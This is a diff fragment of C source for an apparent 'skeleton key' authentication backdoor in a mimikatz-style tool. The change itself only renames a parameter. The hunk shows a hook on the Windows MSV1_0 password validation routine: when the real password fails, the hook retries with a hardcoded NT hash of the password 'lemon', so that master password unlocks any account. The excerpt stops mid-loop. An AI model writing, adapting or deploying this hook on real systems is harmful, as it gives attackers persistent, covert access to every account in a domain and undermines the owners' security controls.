@@ -13,21 +13,21 @@ wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
 
 
 #pragma optimize("", off)
-BOOL WINAPI Skel_MsvpPasswordValidate(LPSTR unk1, NETLOGON_LOGON_INFO_CLASS unk2, PVOID NTstruct, PNT_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5)
+BOOL WINAPI Skel_MsvpPasswordValidate(LPSTR unk1, NETLOGON_LOGON_INFO_CLASS LogonType, PVOID NTstruct, PNT_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5)
 {
 	BOOL status = FALSE;
 	PNT_OWF_PASSWORD pCopyPassword = 0;
 	DWORD iterator = 0;
 	DWORD SkeletonKey[] = { 0x2487308a, 0x6cee17c0, 0x2af4cfe8, 0x329cb78e }; // NT Hash "lemon" : 8a308724c017ee6ce8cff42a8eb79c32
 
-	status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, unk2, NTstruct, pRealPassword, unk3, unk4, unk5); // validate real hash
+	status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, LogonType, NTstruct, pRealPassword, unk3, unk4, unk5); // validate real hash
 	if (!status)
 	{
 		pCopyPassword = (PNT_OWF_PASSWORD)((PLOCALALLOC)0x4242424242424242)(LPTR, sizeof(NT_OWF_PASSWORD));
 		if (pCopyPassword)
 		{
 			((PMEMCPY)0x4141414141414141)(pCopyPassword, SkeletonKey, 0x10);
-			status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, unk2, NTstruct, pCopyPassword, unk3, unk4, unk5); // validate skeleton key
+			status = ((PMSVPPASSWORDVALIDATE)0x3131313131313131)(unk1, LogonType, NTstruct, pCopyPassword, unk3, unk4, unk5); // validate skeleton key
 		}
 
 		for (iterator = 0; iterator < 0x10; iterator++)
